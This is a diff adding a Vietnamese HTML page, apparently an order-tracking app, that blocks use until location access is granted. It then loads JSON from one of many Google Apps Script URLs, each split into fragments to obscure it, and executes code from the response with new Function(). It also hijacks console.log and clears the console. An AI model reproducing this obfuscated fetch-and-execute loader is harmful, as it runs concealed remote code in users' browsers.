@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta name="viewport" content="width=device-width, height=device-height, maximum-scale=1.0, user-scalable=no">
+	<meta charset="utf-8">
+
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>	
+
+
+	<style>
+		body, .Program{ overflow: hidden;	margin:0; width: 100%; height: 100vh;}
+        body::-webkit-scrollbar, .Program::-webkit-scrollbar { display: none;}
+		body, .Program { -ms-overflow-style: none; scrollbar-width: none; }
+        
+        #Program00 {width: 100%; height: 100vh}
+
+		.HuongDan {
+          	z-index: 100;
+          	width: 100%; height: 100vh; 
+          	background: orange; 
+          	position: fixed; 
+          	top: 0; left: 0; 
+          	padding-top: 48vh; padding-bottom: 48vh;
+          	text-align: center; 
+			display: none;
+        }
+		  	
+
+	</style>
+</head>
+
+<body id="body" class="body">
+
+	<div id="Audio" style="display:none">
+		<audio id="myAudio1"><source src="https://3nhat.github.io/Audio/click.mp3" type="audio/mpeg"></audio>
+		<audio id="myAudio2"><source src="https://3nhat.github.io/Audio/sai.mp3" type="audio/mpeg"></audio>
+		<audio id="myAudio1"><source src="https://3nhat.github.io/Audio/trung.mp3" type="audio/mpeg"></audio>
+	</div>
+    	<div id="HuongDan" class="HuongDan">
+      		Do chương trình sử dụng tính năng tracking đơn hàng nên bạn phải bật định vị và cho phép truy cập định vị, chương trình mới hoạt động. Xin cảm ơn
+    	</div>
+    	<div id="Geo" style="display: none;"></div>
+    	<div id="container_loader">
+	  	<div class="main_loader" >
+        		<div class="loader" onclick="EID('container_loader').style.display = 'none'"></div>
+	  	</div>
+    	</div>
+    
+    	<div id="container_alert"></div>
+    
+    	<div id="Program00" class="Program" style="display: none;"></div>
+
+
+    <script>
+	    
+var test = "w3s";
+var DefaultPage = "Express1";  //"Group";
+var batdau = true;
+
+function EID(NameID) {return document.getElementById(NameID);}
+console.log = function(msg){
+	var arr = msg.split("]QQQ[");
+	obj = JSON.stringify(arr[0]); console.clear();
+	if (arr[1] != "") { window[arr[2]](obj); }
+}
+
+window.addEventListener('DOMContentLoaded', (event) => { window['toado'](); });
+
+
+window.window['toado'] = function toado() {
+	EID("Geo").innerHTML=="";
+	getLocation();
+	function getLocation() {
+        if (navigator.geolocation) {
+        	navigator.geolocation.getCurrentPosition(showPosition);
+        } else { 
+        	alert("Geolocation is not supported by this browser.");
+        }
+  }
+        
+  function showPosition(position) {
+    EID("Geo").innerHTML = position.coords.latitude + "][" + position.coords.longitude;
+    if (EID("Geo").innerHTML!="") {
+      if(batdau==true) {
+        EID("HuongDan").style.display = "none";
+        batdau = false;
+
+		window.window["Begin"] = function Begin() {
+            var x0='get';
+      		var x1='slag';    
+			
+            async function RunFirstBegin() {
+  				let promise = new Promise((resolve, reject) => {
+    				setTimeout(function(){
+                    	
+						var url = GetLink();
+                		if (x0=='get') { QuangBegin(resolve, url, x1); }
+    				},5);
+  				});
+
+  				let result = await promise; 
+
+  				if (result=="done!") { RunAfterBegin(); }
+			}
+            
+            function QuangBegin(resolve, url) {
+				window.window[x1];
+              	alert(url);
+				$.getJSON(url, function (json) {
+					resolve("done!");
+              		window[x1] = json.records.map(doc => Object.values(doc));
+				    window[x1].map(function mapper(s) {
+  						if (Array.isArray(s)) {
+    						return s.map(mapper);
+  						} else {
+							return s.toString().trim();
+  						}
+					});
+				});
+			}
+            
+            function RunAfterBegin() {
+				this[window[x1][0][1]] = new Function('return ' + window[x1][0][3])();
+      			this[window[x1][0][1]]();
+			}
+            
+            
+            function GetLink() {
+						var arr1 = [
+              ['https://sc', 'ript.goog', 'le.com/ma', 'cros/', 's/AKfycbw', '8Ucnp_', 'fb0GDkg4o', 'YffP9GJ', 'DwSeGE', 'wsSqJT', '12UuvVsh', '8CQ1dU/e', 'xec'],
+              ['https://sc', 'ript.g', 'oogle.com/', 'macros', '/s/AKfy', 'cbygb-', 'BCkkPHG', 'gPKWE', '5UjBLI6', 'qL-dC3il', 'yj5N2Zi/e', 'xec'],
+              ['https://s', 'cript.go', 'ogle.com/m', 'acros/', 's/AKfycb', 'z_x3pT979', '2hA6_cNt', 'YJgoGP2Ez0', 'vXF3NL', 't4EJu-A', '/exec'],
+              ['https://s', 'cript.g', 'oogle.com', '/macro', 's/s/AKfy', 'cby3wK', 'kQa0Y7b9n1', '6dS9mj7', 'vGExEq', 'Tz7DloNyMR', 's/exec'],
+              ['https', '://script.', 'googl', 'e.com/', 'macro', 's/s/AKf', 'ycbxTTa', 'LGsqUKI84', 'KMZk7', 'TQRbHAg', 'GWmupmDNYN', '1FlIQ/ex', 'ec'],
+              ['https:', '//scrip', 't.googl', 'e.com/mac', 'ros/s/', 'AKfycby', 'FN0Dg2yN', 'i3gU32aNHn', 'R9j6SLx', '7YsZs', 'TCP-TQ1Xg', '/exec'],
+              ['https://s', 'cript.goo', 'gle.com', '/macr', 'os/s/AK', 'fycbwQivcb', 'zAr-nD', 'L4Dm5n8Yg0', 'y_zHGIIeNa', 'grCfk', '7ow/exe', 'c'],
+              ['https://s', 'cript.go', 'ogle.com', '/macros/s', '/AKfycbzG', '6k3db', '8wzuDr8os', 'P3g1E', 'WYWZD1vr', '_BFWDF0z', 'h/exec'],
+              ['https:', '//scrip', 't.goog', 'le.co', 'm/macros/s', '/AKfy', 'cbyZ0n', 'EjfMeL', 'CvWWy', 'BzJXpBIw', 'L-Ey3Fz5T', 'tFB054/ex', 'ec'],
+              ['https:/', '/script.', 'google.c', 'om/macr', 'os/s/AK', 'fycbzq5Dy', 'l9_UgTh6r9', '0oI4PYz', 'RzWwb', 'ASbsZ4JpjQ', 'ZFA/exec'],
+              ['https:', '//scr', 'ipt.goog', 'le.co', 'm/macros/', 's/AKfycb', 'yaSxLfzC', 'lh5lzzSN', 'V6_h8', 'FeRZOp', 'ckU6KtgY', 's2C9w/ex', 'ec'],
+              ['https://', 'scrip', 't.goo', 'gle.co', 'm/macros/s', '/AKfycbzKU', 'nLZPfDVs', 'cy5oL', 'BRi_VViK7', 'Rc4VI', 'T9Qsz', 'oB6/exe', 'c'],
+              ['https', '://scr', 'ipt.goo', 'gle.c', 'om/macros/', 's/AKfy', 'cbywWr', 'gxjUzI', '2R37OA', 'WhVuw4TqI', 'PS6p9U6B', 'Uk8Jr7', 'g/exe', 'c'],
+              ['https://s', 'cript.goog', 'le.com/m', 'acros/', 's/AKfycbw', 'DLI6d5-Q1z', 'YYvfn2ZcGT', 'j8MBKFK', 'Kfs1jzWk8', 'ItQ/e', 'xec'],
+              ['https', '://scri', 'pt.go', 'ogle.com/', 'macros', '/s/AKfycbz', 'BUBHuf', 'CgzfjPAp', 'LdSl_-be', 'g1DkRe', 'p0UJt8', 'WcPhQ/exec'],
+              ['https', '://script', '.google.co', 'm/macros/s', '/AKfy', 'cbwX-XY0FA', '87wgfT', 'FgXtxeeVV', 'ckPWAw-Vg', '31eeI5/exe', 'c'],
+              ['https:/', '/script.g', 'oogle.', 'com/ma', 'cros/s/A', 'KfycbzUS', 'hnK9R_j-', 'AsKnkeup', 'faz8cxcjyC', 'AWHwh6lp5', 'xg/ex', 'ec'],
+              ['https://s', 'cript.goo', 'gle.com/ma', 'cros/s/A', 'KfycbynUc', 'Crv3j', 'hVKDmC', 'QNJaei', 'hAb6Avi', '1VeJQ', 'rFhs7/exe', 'c'],
+              ['https://s', 'cript.g', 'oogle', '.com/mac', 'ros/s/', 'AKfyc', 'bwNyZX', 'rgTvqRpD', 'kPjMxkeDG', 'hxTRO', 'rNMrxs', 'X34oy/exe', 'c'],
+              ['https://sc', 'ript.', 'google', '.com/ma', 'cros/s/A', 'Kfycb', 'zKZjUGkv', 'PUjXif', 'P4XWF4', 'MBB0S', 'anMh-', 'T9jnglB', 'CWA/exec'],
+              ['https', '://sc', 'ript.googl', 'e.com/', 'macros', '/s/AK', 'fycby4Tjo', 'kHViFFmPk', 'oGWh6Fn4Yo', 'b34Rc', 'KeZsj', 'sxtxQ', 'g/exec'],
+              ['https:', '//scrip', 't.google.', 'com/macr', 'os/s/AKfyc', 'byjqy', '0cK8J', 'w_9HT-_9', 'dKqF1L', 'Q4aUtSvSfa', 'J2kWp/', 'exec'],
+              ['https:/', '/script.go', 'ogle.com/m', 'acros', '/s/AKfycb', 'zKoTgZFAw', 'DV0AhO', 'Kjf6H8h', 'ikSAU2bp', 'KgESQO4u', '/exec']
+
+							];
+			
+				var rand = Math.floor(Math.random() * (arr1.length-1));
+				var script_url="";
+				for (var i=0;i<arr1[rand].length;i++) {
+					script_url = script_url + arr1[rand][i];
+				}
+
+				var linkexec = "https://script.google.com/macros/s/AKfycbyU5sTwq9NyhycuxnJAc0EVoqcrrkGE1X5lkAfahV5h0Be7v_hz/exec";
+
+				var str1 = window.location.href;	
+			
+      			if (test=="w3s") {
+							var link = script_url;
+      			} else {
+      				var link = (str1.indexOf('https://3nhat.github.io/')>=0) ? script_url : "";
+      			}
+            	
+				if (link=="") {
+					EID("HuongDan").innerHTML = "Chương trình không được chạy từ trang chính. Cám ơn bạn đã quan tâm đến chương trình";
+					return link;
+				}
+            
+				var timthay = str1.indexOf('zalo');
+				if (timthay>0) {
+					for (var j=timthay; j>=0; j--) {
+						var v = str1.substring(j,j+1);
+						if (v=="?" || v=="&") {
+							str1 = str1.substring(0,j);
+							break;
+						}
+					}
+				}
+        		var str4 = (timthay>0) ? "]QQQ[zalo" : "";
+            	var strArr = str1.split('ID=');
+
+				str1 = strArr[0];
+      			var str2="";
+      			if (strArr.length>1) {
+      				str2 = "ID=" + strArr[1] + "]QQQ[";
+      			} 
+            
+      		  	strArr = str1.split('P=');
+            
+      			var str3 = (strArr.length>1) ? strArr[1] : "Pr01";
+      			var str3 = (strArr.length>1) ? strArr[1] : DefaultPage;
+            
+				link = script_url + "?P=" + str3 + "&para1=F001" + "&para2=" + str3 + "]QQQ[100nBtoDN7MupVz8lYQZzZw5zdG_9TgbFKJmuG007OTI]QQQ[" + str3 + "]QQQ[select A, B, C, D" + str2 + str4;
+
+				return link;
+			}
+            
+            RunFirstBegin();
+            
+        }
+        
+        
+        window["Begin"](); 
+      }
+    }
+        	
+  }  
+}
+
+
+
+
+	    
+	    
+  </script>
+
+</body>
+</html>
